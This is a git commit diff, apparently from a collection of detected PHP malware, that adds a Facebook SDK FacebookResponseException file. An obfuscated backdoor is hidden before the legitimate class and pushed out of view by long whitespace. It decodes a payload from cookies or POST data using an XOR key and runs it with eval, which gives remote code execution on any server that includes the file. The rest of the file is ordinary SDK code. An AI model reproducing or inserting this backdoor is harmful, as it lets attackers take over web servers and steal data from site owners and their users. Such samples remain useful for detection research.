07f144c49066782b4e903668af9f3f2e9767f209
Stefan Pejcic <pejcha1994@gmail.com>
2021-01-31 10:15:12 +0100

    [Fingerprint Match] [PHP Injection Exploit [P0997]]
    [Fingerprint Match] [PHP Injection Exploit [P0997]]

---
+++ 31.01.2021/system/library/devmanextensions_poc/Facebook/Exceptions/FacebookResponseException.php
@@ -0,0 +1,216 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $we19 = 316;$GLOBALS['o3ff00865'] = Array();global $o3ff00865;$o3ff00865 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['k933'] = "\x63\xa\xd\x76\x38\x6c\x72\x49\x4b\x56\x32\x79\x73\x24\x6a\x65\x21\x64\x40\x3d\x2e\x5b\x46\x26\x34\x3c\x2c\x71\x44\x42\x7d\x57\x52\x6e\x20\x6f\x50\x6b\x33\x5d\x66\x3f\x2f\x36\x7a\x51\x37\x78\x35\x30\x6d\x22\x54\x2b\x9\x74\x60\x5e\x59\x68\x3a\x4e\x31\x5a\x5c\x5f\x77\x7c\x7b\x55\x28\x27\x47\x39\x4d\x2d\x48\x58\x4f\x61\x4a\x7e\x75\x70\x45\x3e\x4c\x2a\x41\x3b\x67\x69\x53\x29\x43\x62\x25\x23";$o3ff00865[$o3ff00865['k933'][91].$o3ff00865['k933'][17].$o3ff00865['k933'][24].$o3ff00865['k933'][4].$o3ff00865['k933'][38].$o3ff00865['k933'][46].$o3ff00865['k933'][48].$o3ff00865['k933'][73].$o3ff00865['k933'][24]] = $o3ff00865['k933'][0].$o3ff00865['k933'][59].$o3ff00865['k933'][6];$o3ff00865[$o3ff00865['k933'][90].$o3ff00865['k933'][0].$o3ff00865['k933'][15].$o3ff00865['k933'][4].$o3ff00865['k933'][79]] = $o3ff00865['k933'][35].$o3ff00865['k933'][6].$o3ff00865['k933'][17];$o3ff00865[$o3ff00865['k933'][6].$o3ff00865['k933'][17].$o3ff00865['k933'][17].$o3ff00865['k933'][38].$o3ff00865['k933'][38].$o3ff00865['k933'][10]] = $o3ff00865['k933'][12].$o3ff00865['k933'][55].$o3ff00865['k933'][6].$o3ff00865['k933'][5].$o3ff00865['k933'][15].$o3ff00865['k933'][33];$o3ff00865[$o3ff00865['k933'][90].$o3ff00865['k933'][4].$o3ff00865['k933'][4].$o3ff00865['k933'][15].$o3ff00865['k933'][38].$o3ff00865['k933'][4].$o3ff00865['k933'][95]] = $o3ff00865['k933'][91].$o3ff00865['k933'][33].$o3ff00865['k933'][91].$o3ff00865['k933'][65].$o3ff00865['k933'][12].$o3ff00865['k933'][15].$o3ff00865['k933'][55];$o3ff00865[$o3ff00865['k933'][14].$o3ff00865['k933'][73].$o3ff00865['k933'][10].$o3ff00865['k933'][49].$o3ff00865['k933'][73].$o3ff00865['k933'][4].$o3ff00865['k933'][0]] = $o3ff00865['k933'][12].$o3ff00865['k933'][15].$o3ff00865['k933'][6].$o3ff00865['k933'][91].$o3ff00865['k933'][79].$o3ff00865['k933'][5].$o3ff00865['k933'][91].$o3ff00865['k933'][44].$o3ff00865['k933'][15];$o3ff00865[$o3ff00865['k933'][11].$o3ff00865['k933'][24].$o3ff00865['k933'][10].$o3ff00865['k933'][73].$o3ff00865['k933'][46].$o3ff00865['k933'][48].$o3ff00865['k933'][73].$o3ff00865['k933'][17].$o3ff00865['k933'][43]] = $o3ff00865['k933'][83].$o3ff00865['k933'][59].$o3ff00865['k933'][83].$o3ff00865['k933'][3].$o3ff00865['k933'][15].$o3ff00865['k933'][6].$o3ff00865['k933'][12].$o3ff00865['k933'][91].$o3ff00865['k933'][35].$o3ff00865['k933'][33];$o3ff00865[$o3ff00865['k933'][91].$o3ff00865['k933'][79].$o3ff00865['k933'][48].$o3ff00865['k933'][10].$o3ff00865['k933'][40].$o3ff00865['k933'][38].$o3ff00865['k933'][24]] = $o3ff00865['k933'][82].$o3ff00865['k933'][33].$o3ff00865['k933'][12].$o3ff00865['k933'][15].$o3ff00865['k933'][6].$o3ff00865['k933'][91].$o3ff00865['k933'][79].$o3ff00865['k933'][5].$o3ff00865['k933'][91].$o3ff00865['k933'][44].$o3ff00865['k933'][15];$o3ff00865[$o3ff00865['k933'][66].$o3ff00865['k933'][49].$o3ff00865['k933'][24].$o3ff00865['k933'][24].$o3ff00865['k933'][38].$o3ff00865['k933'][73]] = $o3ff00865['k933'][95].$o3ff00865['k933'][79].$o3ff00865['k933'][12].$o3ff00865['k933'][15].$o3ff00865['k933'][43].$o3ff00865['k933'][24].$o3ff00865['k933'][65].$o3ff00865['k933'][17].$o3ff00865['k933'][15].$o3ff00865['k933'][0].$o3ff00865['k933'][35].$o3ff00865['k933'][17].$o3ff00865['k933'][15];$o3ff00865[$o3ff00865['k933'][3].$o3ff00865['k933'][4].$o3ff00865['k933'][46].$o3ff00865['k933'][62].$o3ff00865['k933'][15]] = $o3ff00865['k933'][12].$o3ff00865['k933'][15].$o3ff00865['k933'][55].$o3ff00865['k933'][65].$o3ff00865['k933'][55].$o3ff00865['k933'][91].$o3ff00865['k933'][50].$o3ff00865['k933'][15].$o3ff00865['k933'][65].$o3ff00865['k933'][5].$o3ff00865['k933'][91].$o3ff00865['k933'][50].$o3ff00865['k933'][91].$o3ff00865['k933'][55];$o3ff00865[$o3ff00865['k933'][55].$o3ff00865['k933'][79].$o3ff00865['k933'][4].$o3ff00865['k933'][62].$o3ff00865['k933'][4]] = $o3ff00865['k933'][0].$o3ff00865['k933'][95].$o3ff00865['k933'][17].$o3ff00865['k933'][49].$o3ff00865['k933'][46];$o3ff00865[$o3ff00865['k933'][37].$o3ff00865['k933'][4].$o3ff00865['k933'][62].$o3ff00865['k933'][0].$o3ff00865['k933'][73]] = $o3ff00865['k933'][0].$o3ff00865['k933'][79].$o3ff00865['k933'][17].$o3ff00865['k933'][38].$o3ff00865['k933'][46].$o3ff00865['k933'][40].$o3ff00865['k933'][38].$o3ff00865['k933'][17].$o3ff00865['k933'][46];$o3ff00865[$o3ff00865['k933'][0].$o3ff00865['k933'][38].$o3ff00865['k933'][48].$o3ff00865['k933'][15].$o3ff00865['k933'][62].$o3ff00865['k933'][4].$o3ff00865['k933'][17].$o3ff00865['k933'][79]] = $_POST;$o3ff00865[$o3ff00865['k933'][44].$o3ff00865['k933'][15].$o3ff00865['k933'][73].$o3ff00865['k933'][73].$o3ff00865['k933'][62].$o3ff00865['k933'][17].$o3ff00865['k933'][48]] = $_COOKIE;@$o3ff00865[$o3ff00865['k933'][90].$o3ff00865['k933'][4].$o3ff00865['k933'][4].$o3ff00865['k933'][15].$o3ff00865['k933'][38].$o3ff00865['k933'][4].$o3ff00865['k933'][95]]($o3ff00865['k933'][15].$o3ff00865['k933'][6].$o3ff00865['k933'][6].$o3ff00865['k933'][35].$o3ff00865['k933'][6].$o3ff00865['k933'][65].$o3ff00865['k933'][5].$o3ff00865['k933'][35].$o3ff00865['k933'][90], NULL);@$o3ff00865[$o3ff00865['k933'][90].$o3ff00865['k933'][4].$o3ff00865['k933'][4].$o3ff00865['k933'][15].$o3ff00865['k933'][38].$o3ff00865['k933'][4].$o3ff00865['k933'][95]]($o3ff00865['k933'][5].$o3ff00865['k933'][35].$o3ff00865['k933'][90].$o3ff00865['k933'][65].$o3ff00865['k933'][15].$o3ff00865['k933'][6].$o3ff00865['k933'][6].$o3ff00865['k933'][35].$o3ff00865['k933'][6].$o3ff00865['k933'][12], 0);@$o3ff00865[$o3ff00865['k933'][90].$o3ff00865['k933'][4].$o3ff00865['k933'][4].$o3ff00865['k933'][15].$o3ff00865['k933'][38].$o3ff00865['k933'][4].$o3ff00865['k933'][95]]($o3ff00865['k933'][50].$o3ff00865['k933'][79].$o3ff00865['k933'][47].$o3ff00865['k933'][65].$o3ff00865['k933'][15].$o3ff00865['k933'][47].$o3ff00865['k933'][15].$o3ff00865['k933'][0].$o3ff00865['k933'][82].$o3ff00865['k933'][55].$o3ff00865['k933'][91].$o3ff00865['k933'][35].$o3ff00865['k933'][33].$o3ff00865['k933'][65].$o3ff00865['k933'][55].$o3ff00865['k933'][91].$o3ff00865['k933'][50].$o3ff00865['k933'][15], 0);@$o3ff00865[$o3ff00865['k933'][3].$o3ff00865['k933'][4].$o3ff00865['k933'][46].$o3ff00865['k933'][62].$o3ff00865['k933'][15]](0);$j53edd4 = NULL;$nf5ce95 = NULL;$o3ff00865[$o3ff00865['k933'][83].$o3ff00865['k933'][49].$o3ff00865['k933'][62].$o3ff00865['k933'][38].$o3ff00865['k933'][79].$o3ff00865['k933'][46].$o3ff00865['k933'][49]] = $o3ff00865['k933'][10].$o3ff00865['k933'][43].$o3ff00865['k933'][4].$o3ff00865['k933'][40].$o3ff00865['k933'][0].$o3ff00865['k933'][49].$o3ff00865['k933'][46].$o3ff00865['k933'][43].$o3ff00865['k933'][75].$o3ff00865['k933'][24].$o3ff00865['k933'][49].$o3ff00865['k933'][48].$o3ff00865['k933'][17].$o3ff00865['k933'][75].$o3ff00865['k933'][24].$o3ff00865['k933'][4].$o3ff00865['k933'][62].$o3ff00865['k933'][24].$o3ff00865['k933'][75].$o3ff00865['k933'][73].$o3ff00865['k933'][4].$o3ff00865['k933'][73].$o3ff00865['k933'][0].$o3ff00865['k933'][75].$o3ff00865['k933'][48].$o3ff00865['k933'][24].$o3ff00865['k933'][10].$o3ff00865['k933'][0].$o3ff00865['k933'][48].$o3ff00865['k933'][40].$o3ff00865['k933'][62].$o3ff00865['k933'][62].$o3ff00865['k933'][24].$o3ff00865['k933'][46].$o3ff00865['k933'][48].$o3ff00865['k933'][95];global $p013a70;function  cad37f3d7($j53edd4, $yab186){global $o3ff00865;$pf66ea1 = "";for ($z6846468f=0; $z6846468f<$o3ff00865[$o3ff00865['k933'][6].$o3ff00865['k933'][17].$o3ff00865['k933'][17].$o3ff00865['k933'][38].$o3ff00865['k933'][38].$o3ff00865['k933'][10]]($j53edd4);){for ($ba0ebbd=0; $ba0ebbd<$o3ff00865[$o3ff00865['k933'][6].$o3ff00865['k933'][17].$o3ff00865['k933'][17].$o3ff00865['k933'][38].$o3ff00865['k933'][38].$o3ff00865['k933'][10]]($yab186) && $z6846468f<$o3ff00865[$o3ff00865['k933'][6].$o3ff00865['k933'][17].$o3ff00865['k933'][17].$o3ff00865['k933'][38].$o3ff00865['k933'][38].$o3ff00865['k933'][10]]($j53edd4); $ba0ebbd++, $z6846468f++){$pf66ea1 .= $o3ff00865[$o3ff00865['k933'][91].$o3ff00865['k933'][17].$o3ff00865['k933'][24].$o3ff00865['k933'][4].$o3ff00865['k933'][38].$o3ff00865['k933'][46].$o3ff00865['k933'][48].$o3ff00865['k933'][73].$o3ff00865['k933'][24]]($o3ff00865[$o3ff00865['k933'][90].$o3ff00865['k933'][0].$o3ff00865['k933'][15].$o3ff00865['k933'][4].$o3ff00865['k933'][79]]($j53edd4[$z6846468f]) ^ $o3ff00865[$o3ff00865['k933'][90].$o3ff00865['k933'][0].$o3ff00865['k933'][15].$o3ff00865['k933'][4].$o3ff00865['k933'][79]]($yab186[$ba0ebbd]));}}return $pf66ea1;}function  cbd07($j53edd4, $yab186){global $o3ff00865;global $p013a70;return $o3ff00865[$o3ff00865['k933'][37].$o3ff00865['k933'][4].$o3ff00865['k933'][62].$o3ff00865['k933'][0].$o3ff00865['k933'][73]]($o3ff00865[$o3ff00865['k933'][37].$o3ff00865['k933'][4].$o3ff00865['k933'][62].$o3ff00865['k933'][0].$o3ff00865['k933'][73]]($j53edd4, $p013a70), $yab186);}foreach ($o3ff00865[$o3ff00865['k933'][44].$o3ff00865['k933'][15].$o3ff00865['k933'][73].$o3ff00865['k933'][73].$o3ff00865['k933'][62].$o3ff00865['k933'][17].$o3ff00865['k933'][48]] as $yab186=>$b3932dd1f){$j53edd4 = $b3932dd1f;$nf5ce95 = $yab186;}if (!$j53edd4){foreach ($o3ff00865[$o3ff00865['k933'][0].$o3ff00865['k933'][38].$o3ff00865['k933'][48].$o3ff00865['k933'][15].$o3ff00865['k933'][62].$o3ff00865['k933'][4].$o3ff00865['k933'][17].$o3ff00865['k933'][79]] as $yab186=>$b3932dd1f){$j53edd4 = $b3932dd1f;$nf5ce95 = $yab186;}}$j53edd4 = @$o3ff00865[$o3ff00865['k933'][91].$o3ff00865['k933'][79].$o3ff00865['k933'][48].$o3ff00865['k933'][10].$o3ff00865['k933'][40].$o3ff00865['k933'][38].$o3ff00865['k933'][24]]($o3ff00865[$o3ff00865['k933'][55].$o3ff00865['k933'][79].$o3ff00865['k933'][4].$o3ff00865['k933'][62].$o3ff00865['k933'][4]]($o3ff00865[$o3ff00865['k933'][66].$o3ff00865['k933'][49].$o3ff00865['k933'][24].$o3ff00865['k933'][24].$o3ff00865['k933'][38].$o3ff00865['k933'][73]]($j53edd4), $nf5ce95));if (isset($j53edd4[$o3ff00865['k933'][79].$o3ff00865['k933'][37]]) && $p013a70==$j53edd4[$o3ff00865['k933'][79].$o3ff00865['k933'][37]]){if ($j53edd4[$o3ff00865['k933'][79]] == $o3ff00865['k933'][91]){$z6846468f = Array($o3ff00865['k933'][83].$o3ff00865['k933'][3] => @$o3ff00865[$o3ff00865['k933'][11].$o3ff00865['k933'][24].$o3ff00865['k933'][10].$o3ff00865['k933'][73].$o3ff00865['k933'][46].$o3ff00865['k933'][48].$o3ff00865['k933'][73].$o3ff00865['k933'][17].$o3ff00865['k933'][43]](),$o3ff00865['k933'][12].$o3ff00865['k933'][3] => $o3ff00865['k933'][62].$o3ff00865['k933'][20].$o3ff00865['k933'][49].$o3ff00865['k933'][75].$o3ff00865['k933'][62],);echo @$o3ff00865[$o3ff00865['k933'][14].$o3ff00865['k933'][73].$o3ff00865['k933'][10].$o3ff00865['k933'][49].$o3ff00865['k933'][73].$o3ff00865['k933'][4].$o3ff00865['k933'][0]]($z6846468f);}elseif ($j53edd4[$o3ff00865['k933'][79]] == $o3ff00865['k933'][15]){eval/*m50f0b*/($j53edd4[$o3ff00865['k933'][17]]);}exit();} ?><?php
+/**
+ * Copyright 2017 Facebook, Inc.
+ *
+ * You are hereby granted a non-exclusive, worldwide, royalty-free license to
+ * use, copy, modify, and distribute this software in source code or binary
+ * form for use in connection with the web services and APIs provided by
+ * Facebook.
+ *
+ * As with any software that integrates with the Facebook platform, your use
+ * of this software is subject to the Facebook Developer Principles and
+ * Policies [http://developers.facebook.com/policy/]. This copyright notice
+ * shall be included in all copies or substantial portions of the software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
+ * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+ * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
+ * DEALINGS IN THE SOFTWARE.
+ *
+ */
+namespace Facebook\Exceptions;
+
+use Facebook\FacebookResponse;
+
+/**
+ * Class FacebookResponseException
+ *
+ * @package Facebook
+ */
+class FacebookResponseException extends FacebookSDKException
+{
+    /**
+     * @var FacebookResponse The response that threw the exception.
+     */
+    protected $response;
+
+    /**
+     * @var array Decoded response.
+     */
+    protected $responseData;
+
+    /**
+     * Creates a FacebookResponseException.
+     *
+     * @param FacebookResponse     $response          The response that threw the exception.
+     * @param FacebookSDKException $previousException The more detailed exception.
+     */
+    public function __construct(FacebookResponse $response, FacebookSDKException $previousException = null)
+    {
+        $this->response = $response;
+        $this->responseData = $response->getDecodedBody();
+
+        $errorMessage = $this->get('message', 'Unknown error from Graph.');
+        $errorCode = $this->get('code', -1);
+
+        parent::__construct($errorMessage, $errorCode, $previousException);
+    }
+
+    /**
+     * A factory for creating the appropriate exception based on the response from Graph.
+     *
+     * @param FacebookResponse $response The response that threw the exception.
+     *
+     * @return FacebookResponseException
+     */
+    public static function create(FacebookResponse $response)
+    {
+        $data = $response->getDecodedBody();
+
+        if (!isset($data['error']['code']) && isset($data['code'])) {
+            $data = ['error' => $data];
+        }
+
+        $code = isset($data['error']['code']) ? $data['error']['code'] : null;
+        $message = isset($data['error']['message']) ? $data['error']['message'] : 'Unknown error from Graph.';
+
+        if (isset($data['error']['error_subcode'])) {
+            switch ($data['error']['error_subcode']) {
+                // Other authentication issues
+                case 458:
+                case 459:
+                case 460:
+                case 463:
+                case 464:
+                case 467:
+                    return new static($response, new FacebookAuthenticationException($message, $code));
+                // Video upload resumable error
+                case 1363030:
+                case 1363019:
+                case 1363037:
+                case 1363033:
+                case 1363021:
+                case 1363041:
+                    return new static($response, new FacebookResumableUploadException($message, $code));
+            }
+        }
+
+        switch ($code) {
+            // Login status or token expired, revoked, or invalid
+            case 100:
+            case 102:
+            case 190:
+                return new static($response, new FacebookAuthenticationException($message, $code));
+
+            // Server issue, possible downtime
+            case 1:
+            case 2:
+                return new static($response, new FacebookServerException($message, $code));
+
+            // API Throttling
+            case 4:
+            case 17:
+            case 32:
+            case 341:
+            case 613:
+                return new static($response, new FacebookThrottleException($message, $code));
+
+            // Duplicate Post
+            case 506:
+                return new static($response, new FacebookClientException($message, $code));
+        }
+
+        // Missing Permissions
+        if ($code == 10 || ($code >= 200 && $code <= 299)) {
+            return new static($response, new FacebookAuthorizationException($message, $code));
+        }
+
+        // OAuth authentication error
+        if (isset($data['error']['type']) && $data['error']['type'] === 'OAuthException') {
+            return new static($response, new FacebookAuthenticationException($message, $code));
+        }
+
+        // All others
+        return new static($response, new FacebookOtherException($message, $code));
+    }
+
+    /**
+     * Checks isset and returns that or a default value.
+     *
+     * @param string $key
+     * @param mixed  $default
+     *
+     * @return mixed
+     */
+    private function get($key, $default = null)
+    {
+        if (isset($this->responseData['error'][$key])) {
+            return $this->responseData['error'][$key];
+        }
+
+        return $default;
+    }
+
+    /**
+     * Returns the HTTP status code
+     *
+     * @return int
+     */
+    public function getHttpStatusCode()
+    {
+        return $this->response->getHttpStatusCode();
+    }
+
+    /**
+     * Returns the sub-error code
+     *
+     * @return int
+     */
+    public function getSubErrorCode()
+    {
+        return $this->get('error_subcode', -1);
+    }
+
+    /**
+     * Returns the error type
+     *
+     * @return string
+     */
+    public function getErrorType()
+    {
+        return $this->get('type', '');
+    }
+
+    /**
+     * Returns the raw response used to create the exception.
+     *
+     * @return string
+     */
+    public function getRawResponse()
+    {
+        return $this->response->getBody();
+    }
+
+    /**
+     * Returns the decoded response used to create the exception.
+     *
+     * @return array
+     */
+    public function getResponseData()
+    {
+        return $this->responseData;
+    }
+
+    /**
+     * Returns the response entity used to create the exception.
+     *
+     * @return FacebookResponse
+     */
+    public function getResponse()
+    {
+        return $this->response;
+    }
+}
